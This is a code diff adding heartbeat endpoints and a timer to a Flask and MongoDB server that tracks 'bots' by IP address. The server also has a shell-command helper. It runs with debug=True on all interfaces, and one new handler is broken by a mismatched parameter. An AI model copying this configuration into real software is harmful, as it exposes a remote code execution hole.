@@ -4,6 +4,8 @@ from pymongo import *
 from flask_cors import CORS
 from collections import Counter
 import subprocess
+import threading
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
@@ -16,6 +18,12 @@ def execute(cmd):
     return_code = popen.wait()
     if return_code:
         raise subprocess.CalledProcessError(return_code, cmd)
+
+
+def timechecker():
+    print("running")
+    threading.Timer(10, timechecker).start()
+
 
 
 @app.errorhandler(404)
@@ -210,11 +218,29 @@ def storeDirectory(ip):
     return jsonify({'code':200})
 
 
+###Heartbeat API which changes the bit of the bot to 1.
+@app.route('/heartbeatbot/<ip>', methods=['POST'])
+def hearbeat(ip):
+    j = request.get_json()
+    val = bots_table.find_one({"ip":ip})
+    if(val is None):
+        return jsonify({"data" : "device not available"})
 
+    bots_table.update_one({'ip' : ip},{"$set" :{"active" : 1}})
+    return jsonify({}),200
+
+#Decrement all by 1
+@app.route('/heartbeatdec',methods=['POST'])
+def heart(ip):
+    bots_table.update_many({"active" : 0},{"$set" : {"active" : -1}})
+    bots_table.update_many({"active" : 1},{"$set" : {"active" : 0}})
+
+    return jsonify({}),200
 
 
 
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
+    #threading.Timer(10, timechecker).start()
     app.run(debug=True, host='0.0.0.0', port=port)
